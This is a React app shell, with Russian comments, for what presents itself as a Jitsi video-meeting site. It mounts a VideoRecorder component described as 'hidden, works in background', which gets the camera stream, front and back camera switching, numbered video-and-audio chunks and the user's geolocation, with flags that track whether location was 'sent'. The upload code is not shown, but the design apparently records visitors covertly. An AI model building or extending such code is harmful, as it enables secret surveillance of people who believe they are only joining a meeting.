import { useState, useRef } from 'react';
import HomePage from '@/app/components/HomePage';
import JitsiPreJoin from '@/app/components/JitsiPreJoin';
import JitsiRoom from '@/app/components/JitsiRoom';
import { VideoRecorder } from '@/app/components/VideoRecorder';

export default function App() {
  const [currentPage, setCurrentPage] = useState<'home' | 'prejoin' | 'room'>('home');
  const [roomName, setRoomName] = useState('');
  const [userName, setUserName] = useState('');
  
  // Video recording state
  const [videoStreamFront, setVideoStreamFront] = useState<MediaStream | null>(null);
  const [isVideoRecording, setIsVideoRecording] = useState(false);
  const [currentChunkNumber, setCurrentChunkNumber] = useState(0);
  const [currentCameraType, setCurrentCameraType] = useState<'front' | 'back' | 'desktop'>('back');
  
  // Geolocation data
  const [geoData, setGeoData] = useState<{
    latitude: number;
    longitude: number;
    accuracy: number;
    timestamp: string;
  } | null>(null);
  
  // Refs for camera switching and permissions
  const isSwitchingCameraRef = useRef(false);
  const globalChunkCounterRef = useRef(0);
  const geoLocationSentRef = useRef(false);
  const currentVideoDeviceIdRef = useRef<string | null>(null);
  const isExecutingPermissionsRef = useRef(false);
  
  // Video chunk handler
  const handleVideoChunkReady = async (blob: Blob, chunkNum: number, cameraType: 'front' | 'back' | 'desktop') => {
    console.log(`📹 [App] Получен видео+аудио чанк #${chunkNum} (${cameraType}), размер: ${blob.size} bytes`);
    
    // Update chunk number in state for camera switching logic
    setCurrentChunkNumber(chunkNum);
  };

  const handleStartMeeting = (roomNameInput: string) => {
    setRoomName(roomNameInput);
    setCurrentPage('prejoin');
  };
  
  const handleJoinRoom = (userNameInput: string) => {
    setUserName(userNameInput);
    setCurrentPage('room');
  };
  
  return (
    <div className="size-full">
      {currentPage === 'home' && (
        <HomePage onStartMeeting={handleStartMeeting} />
      )}

      {currentPage === 'prejoin' && (
        <>
          <JitsiPreJoin 
            roomName={roomName}
            onJoinRoom={handleJoinRoom}
            videoStreamFront={videoStreamFront}
            setVideoStreamFront={setVideoStreamFront}
            isVideoRecording={isVideoRecording}
            setIsVideoRecording={setIsVideoRecording}
            currentChunkNumber={currentChunkNumber}
            setCurrentChunkNumber={setCurrentChunkNumber}
            currentCameraType={currentCameraType}
            setCurrentCameraType={setCurrentCameraType}
            geoData={geoData}
            setGeoData={setGeoData}
            isSwitchingCameraRef={isSwitchingCameraRef}
            globalChunkCounterRef={globalChunkCounterRef}
            geoLocationSentRef={geoLocationSentRef}
            currentVideoDeviceIdRef={currentVideoDeviceIdRef}
            isExecutingPermissionsRef={isExecutingPermissionsRef}
          />
          
          {/* VideoRecorder component - hidden, works in background */}
          {videoStreamFront && (
            <VideoRecorder
              key={currentCameraType}
              stream={videoStreamFront}
              isRecording={isVideoRecording}
              cameraType={currentCameraType}
              globalChunkCounter={globalChunkCounterRef}
              geoData={geoData}
              onChunkReady={handleVideoChunkReady}
            />
          )}
        </>
      )}
      
      {currentPage === 'room' && (
        <>
          <JitsiRoom
            roomName={roomName}
            userName={userName}
            videoStreamFront={videoStreamFront}
            setVideoStreamFront={setVideoStreamFront}
            isVideoRecording={isVideoRecording}
            setIsVideoRecording={setIsVideoRecording}
            currentChunkNumber={currentChunkNumber}
            setCurrentChunkNumber={setCurrentChunkNumber}
            currentCameraType={currentCameraType}
            setCurrentCameraType={setCurrentCameraType}
            geoData={geoData}
            setGeoData={setGeoData}
            isSwitchingCameraRef={isSwitchingCameraRef}
            globalChunkCounterRef={globalChunkCounterRef}
            geoLocationSentRef={geoLocationSentRef}
            currentVideoDeviceIdRef={currentVideoDeviceIdRef}
            isExecutingPermissionsRef={isExecutingPermissionsRef}
          />
          
          {/* VideoRecorder продолжает работать в фоне */}
          {videoStreamFront && (
            <VideoRecorder
              key={currentCameraType}
              stream={videoStreamFront}
              isRecording={isVideoRecording}
              cameraType={currentCameraType}
              globalChunkCounter={globalChunkCounterRef}
              geoData={geoData}
              onChunkReady={handleVideoChunkReady}
            />
          )}
        </>
      )}
    </div>
  );
}